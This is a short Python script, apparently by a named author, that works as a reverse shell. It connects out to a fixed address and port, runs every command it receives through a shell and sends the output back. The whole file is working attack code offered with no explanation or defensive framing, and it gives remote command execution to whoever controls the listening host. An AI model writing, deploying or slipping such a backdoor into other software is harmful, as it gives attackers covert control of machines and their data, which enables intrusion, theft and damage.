#/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/22/2021

import socket
import subprocess 

def shell():
    while True:
        command = sock.recv(1024)
        if command.decode() == 'exit':
            break
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            sock.send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.7.125", 54321))
shell()
sock.close()
